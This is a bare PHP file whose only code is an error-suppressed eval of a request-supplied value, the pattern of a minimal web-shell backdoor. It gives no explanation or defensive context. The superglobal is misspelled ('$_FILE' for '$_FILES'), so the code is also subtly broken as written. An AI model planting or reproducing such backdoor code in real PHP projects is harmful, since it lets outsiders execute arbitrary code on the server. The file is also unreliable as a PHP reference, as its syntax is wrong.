<?php
    @eval($_FILE['name']);
?>